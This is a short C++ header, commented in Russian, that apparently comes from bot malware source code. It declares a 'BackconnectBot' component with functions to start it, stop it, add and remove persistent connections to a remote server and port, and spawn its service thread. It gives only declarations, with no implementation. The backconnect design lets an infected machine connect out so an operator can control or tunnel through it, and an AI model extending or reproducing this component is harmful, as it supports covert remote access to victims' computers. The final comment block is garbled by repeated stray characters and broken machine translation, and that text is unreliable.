/*
  Сервер бекконекта.
*/
#pragma once

#if(BO_BCSERVER_PLATFORMS > 0)

#include "..\common\threadsgroup.h"

namespace BackconnectBot
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Добавление постоянного подключения.

    IN servicePort - порт или название сервиса.
    IN server      - сервер.
    IN serverPort  - порт сервера.

    Return         - true - в случаи успеха,
                     false - в случаи ошибки.
  */
  bool _addStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort);
  
  /*
    Удаление постоянного подключения.

    IN servicePort - порт или название сервиса. Может содержать маски '*' или '?'.
    IN server      - сервер. Может содержать маски '*' или '?'.
    IN serverPort  - порт сервера. Может содержать маски '*' или '?'.

    Return         - true - в случаи успеха,
                     false - в случаи ошибки.
  */
  bool _removeStatic(LPSTR servicePort, LPSTR server, LPSTR serverPort);

  /*В В В В Thread creation.

В В В В IN OUT group - the group potokok to which will belong to the flow of service.
В В В В 
В В В В Return - true - if successful,
В В В В В В В В В В В В В В В В В В В false - if an error occurs.
В В */
  bool _create(ThreadsGroup::GROUP *group);
};
#endif
